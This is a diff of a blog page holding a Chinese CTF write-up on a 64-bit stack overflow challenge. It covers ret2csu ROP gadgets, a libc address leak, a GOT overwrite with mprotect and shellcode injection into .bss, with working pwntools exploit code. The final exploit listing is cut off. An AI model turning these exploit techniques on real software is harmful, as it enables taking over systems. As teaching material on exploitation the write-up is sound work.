@@ -1,218 +1,391 @@
 <!DOCTYPE html>
-<html lang="en">
 
 
 
+  
 
 
+<html class="theme-next gemini use-motion" lang="en">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="Paxos">
-  <meta name="keywords" content="">
-  <title>从一道经典的x64pwn学习mprotect与GOT表覆写 - ScUpax0s</title>
-
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
 
   
-    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/dracula.min.css" />
+  
+  
   
 
   
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
 
 
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
 
 
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
+  <meta name="keywords" content="Hexo, NexT" />
 
 
-  <script  src="/js/utils.js" ></script>
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ScUpax0s" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="写在前面（考察知识点） x64通用ROPgadget构造传参 libc_base地址计算 mprotect函数基本用法（.bss段权限调整） GOT表覆写 shellcode注入.bss段  程序分析 给出了一个64为可执行程序和一个相应的libc system、exec函数族函数被禁用（实际没有，但是题目要求我们按照禁用的做，不可使用system和exec族函数） 没有可使用的现成的shellc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道经典的x64pwn学习mprotect与GOT表覆写">
+<meta property="og:url" content="http://yoursite.com/2020/04/30/%E4%BB%8E%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84x64pwn%E5%AD%A6%E4%B9%A0mprotect%E4%B8%8EGOT%E8%A1%A8%E8%A6%86%E5%86%99/index.html">
+<meta property="og:site_name" content="ScUpax0s">
+<meta property="og:description" content="写在前面（考察知识点） x64通用ROPgadget构造传参 libc_base地址计算 mprotect函数基本用法（.bss段权限调整） GOT表覆写 shellcode注入.bss段  程序分析 给出了一个64为可执行程序和一个相应的libc system、exec函数族函数被禁用（实际没有，但是题目要求我们按照禁用的做，不可使用system和exec族函数） 没有可使用的现成的shellc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/Jqsuc9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JqshBq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JqWbon.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/Jq70Df.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/Jq7lDK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JqLnIO.png">
+<meta property="article:published_time" content="2020-04-30T08:38:37.000Z">
+<meta property="article:modified_time" content="2020-05-08T15:00:10.031Z">
+<meta property="article:author" content="Paxos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/04/30/Jqsuc9.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/30/从一道经典的x64pwn学习mprotect与GOT表覆写/"/>
+
+
+
+
+
+  <title>从一道经典的x64pwn学习mprotect与GOT表覆写 | ScUpax0s</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <meta name="generator" content="Hexo 4.2.0"></head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
 
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+  
+  
+    
+  
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                Home
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                Archives
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                About
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ScUpax0s</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              
-  <div class="mt-3 post-meta">
-    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-04-30 16:38">
-      April 30, 2020 pm
-    </time>
+      
+        <p class="site-subtitle"></p>
+      
   </div>
 
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.8k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      22
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
 </div>
 
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
             
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
       
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <div class="post-content mx-auto" id="post">
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
             
-            <article class="markdown-body">
-              <h2 id="写在前面（考察知识点）"><a href="#写在前面（考察知识点）" class="headerlink" title="写在前面（考察知识点）"></a>写在前面（考察知识点）</h2><ul>
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/30/%E4%BB%8E%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84x64pwn%E5%AD%A6%E4%B9%A0mprotect%E4%B8%8EGOT%E8%A1%A8%E8%A6%86%E5%86%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Paxos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ScUpax0s">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从一道经典的x64pwn学习mprotect与GOT表覆写</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-30T16:38:37+08:00">
+                2020-04-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="写在前面（考察知识点）"><a href="#写在前面（考察知识点）" class="headerlink" title="写在前面（考察知识点）"></a>写在前面（考察知识点）</h2><ul>
 <li>x64通用ROPgadget构造传参</li>
 <li>libc_base地址计算</li>
 <li>mprotect函数基本用法（.bss段权限调整）</li>
@@ -225,9 +398,9 @@
 <li>没有可使用的现成的shellcode（需要自己注入进去shellcode）</li>
 <li>bss段<strong>没有可执行权限</strong>，要用mprotect去改</li>
 </ul>
-<h2 id="开始pwn"><a href="#开始pwn" class="headerlink" title="开始pwn"></a>开始pwn</h2><p><strong>1.主体程序分析：</strong><br><img src="https://s1.ax1x.com/2020/04/30/Jqsuc9.png" srcset="/img/loading.gif" alt="a"><br>一个典型的栈溢出：分配了0x80，读进去200，不过这道题难点不在这里，难点在于，禁用system，exec函数族，没有shellcode。。（啥都没有）我们要想方设法重复利用这个栈溢出去达到我们的目的。<br><img src="https://s1.ax1x.com/2020/04/30/JqshBq.png" srcset="/img/loading.gif" alt="b"><br>看一些GOT表里面的函数，我们覆写的时候要选择能用的。<br><strong>2.整体思路过程</strong></p>
+<h2 id="开始pwn"><a href="#开始pwn" class="headerlink" title="开始pwn"></a>开始pwn</h2><p><strong>1.主体程序分析：</strong><br><img src="https://s1.ax1x.com/2020/04/30/Jqsuc9.png" alt="a"><br>一个典型的栈溢出：分配了0x80，读进去200，不过这道题难点不在这里，难点在于，禁用system，exec函数族，没有shellcode。。（啥都没有）我们要想方设法重复利用这个栈溢出去达到我们的目的。<br><img src="https://s1.ax1x.com/2020/04/30/JqshBq.png" alt="b"><br>看一些GOT表里面的函数，我们覆写的时候要选择能用的。<br><strong>2.整体思路过程</strong></p>
 <ul>
-<li><p>首先我们这道题要重复使用x64下的基于__libc_csu_init(),这个函数实际上是程序的一个构造函数（当然有构造函数也有对应的析构函数）详情看(虽然是x86的，但也可以借鉴)<a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">Linux X86 程序启动 – main函数是如何被执行的？</a><br>这是万能ROPgadget本体：<br><img src="https://s1.ax1x.com/2020/04/30/JqWbon.png" srcset="/img/loading.gif" alt=""><br>我们将它分为三部分看：<br>（1）<strong>0x4006aa到0x4006b4</strong><br> 在这一部分，我们将栈中的值pop到rbx、rbp、r12、r13、r14、r15，也就是说，如果我们提前在栈上布置好，就可以把值送入这些寄存器，已被后续使用。</p>
+<li><p>首先我们这道题要重复使用x64下的基于__libc_csu_init(),这个函数实际上是程序的一个构造函数（当然有构造函数也有对应的析构函数）详情看(虽然是x86的，但也可以借鉴)<a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">Linux X86 程序启动 – main函数是如何被执行的？</a><br>这是万能ROPgadget本体：<br><img src="https://s1.ax1x.com/2020/04/30/JqWbon.png" alt=""><br>我们将它分为三部分看：<br>（1）<strong>0x4006aa到0x4006b4</strong><br> 在这一部分，我们将栈中的值pop到rbx、rbp、r12、r13、r14、r15，也就是说，如果我们提前在栈上布置好，就可以把值送入这些寄存器，已被后续使用。</p>
 <p>  （2）<strong>0x400690到0x400699</strong><br>  在这一部分，我们将r13，r14，r15d分别送入rdx，rdi，edi（rdi的低位），而在x64传参数的时候，前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。这是与x86很不一样的一点。<a href="https://www.ituring.com.cn/article/216561" target="_blank" rel="noopener">记一次linux x64 的栈溢出</a>，也就是说，在这一部分，我们可以完成前三个参数的传递，这样我们进入函数的基础就有了，接下来<code>0x0000000000400699 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8]</code>这里会帮助我们跳转到我们要执行的函数，这样就完成了一次劫持，不过要注意的是：r12并不是我们目标函数的地址，准确的来说，我们要将目标函数（或shellcode）覆写GOT表中（替换一个got表中已有的函数），然后通过跳转进入相应的GOT表中的表项来达到执行目标函数的目的！（这里一开始踩坑了。。）</p>
 <p>  （3）<strong>0x40069d到0x4006a4</strong><br>   在这里，给rbx+1，然后判断rbx和rbp大小， 我们想要顺利通过这里，不被<code>0x00000000004006a4 &lt;+84&gt;:    jne    0x400690 &lt;__libc_csu_init+64&gt;</code>循环卡死，所以在一开始设置rbx=0；rbp=1，就可以顺利通过这里。</p>
 </li>
@@ -235,281 +408,486 @@
 <p><strong>不过很重要的一点！在完成整个ROPgadget的时候，最后一定要加上cyclic（0x38）来补位！，原因在于，当你执行这个gadget，实际上他不是按照正常流程执行的，0x4006aa到0x4006b4 这一段pop；ret的过程执行了两次，导致整个栈被抬高了 7*8=56个bytes，所以要做一个补位，才能达到真正的返回地址</strong>  </p>
 <ul>
 <li><p>给出我们的x64ROPgadget函数，把它写成一个函数，我们要多次利用</p>
-<figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br></pre></div></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>然后使用我们构造好的函数，首先leak出libc_base，拿到mprotect的真实地址</p>
-<figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br></pre></div></td></tr></table></figure></li>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br></pre></td></tr></table></figure></li>
 <li><p>接下来，由于我们没有shellcode，我们需要手动读进来shellcode，然后放到bss段上，这里我们的func_got是read，然后第一个参数为0，代表stdin，bss_addr代表我们要向bss段读，然后读取生成的len(shellcode)个字节。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">_x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">io.send(shellcode)</span><br></pre></div></td></tr></table></figure></li>
-<li><p>好了，现在我们有了shellcod了，但问题来了，看一下bss段的权限<br><img src="https://s1.ax1x.com/2020/04/30/Jq70Df.png" srcset="/img/loading.gif" alt=""><br><img src="https://s1.ax1x.com/2020/04/30/Jq7lDK.png" srcset="/img/loading.gif" alt=""><br>尴尬，bss段压根没有可执行权限啊。。好了，那我们需要用mprotect来手动改掉他的权限。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">_x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">io.send(shellcode)</span><br></pre></td></tr></table></figure></li>
+<li><p>好了，现在我们有了shellcod了，但问题来了，看一下bss段的权限<br><img src="https://s1.ax1x.com/2020/04/30/Jq70Df.png" alt=""><br><img src="https://s1.ax1x.com/2020/04/30/Jq7lDK.png" alt=""><br>尴尬，bss段压根没有可执行权限啊。。好了，那我们需要用mprotect来手动改掉他的权限。</p>
 </li>
 </ul>
 <ul>
 <li><p>现在我们需要将bss段权限改掉，加上可执行权限。不过在这之前，我们还要做一件事情，我们需要将mprotect函数写进GOT表，替换掉一个got表中原有的函数（偷天换日），这样才能成功的调用mprotect来修改权限。这里我们使用read函数来读入，调用read_got，stdin，向本来存<code>__libc_start_main</code>的got位置，写进去8个字节，也就是把这个位置覆写掉，然后我们在<code>io.send(p64(mprotect))</code>向他发送mprotect的地址，此时read把这个mprotect的地址就读进去了。ok！覆写GOT成功。此时可以通过跳转到<code>__libc_start_main</code>来调用mprotect了。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">_x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">io.send(p64(mprotect))</span><br></pre></div></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">io.send(p64(mprotect))</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>接下来我们修改bss段为可执行权限。我们向__libc_start_main跳转，由于此时这个函数已经被覆写，实际我们跳转的位置是mprotect，OK，我们修改0x00600000起始，0x1000个字节地址权限为0x7（可执行），<strong>注意，这里一定是0x00600000开始，因为mprotect在修改时会做页对齐，如果我们不从一个对齐的位置修改，是达不到目的的。</strong><a href="https://blog.csdn.net/roland_sun/article/details/33728955" target="_blank" rel="noopener">关于mprotect</a></p>
 </li>
 </ul>
-<figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br></pre></div></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br></pre></td></tr></table></figure>
 <ul>
-<li>好了！所有准备工作完毕，现在开始pwn！其实这里很简单,我们再做一次溢出然后直接跳到bss_addr的位置，也就是我们放shellcode的位置，因为此时bss段已经变为可执行的，那么程序会自动执行这个段上的内容。<figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></div></td></tr></table></figure>
+<li>好了！所有准备工作完毕，现在开始pwn！其实这里很简单,我们再做一次溢出然后直接跳到bss_addr的位置，也就是我们放shellcode的位置，因为此时bss段已经变为可执行的，那么程序会自动执行这个段上的内容。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<h2 id="最终exp与结果"><a href="#最终exp与结果" class="headerlink" title="最终exp与结果"></a>最终exp与结果</h2><figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 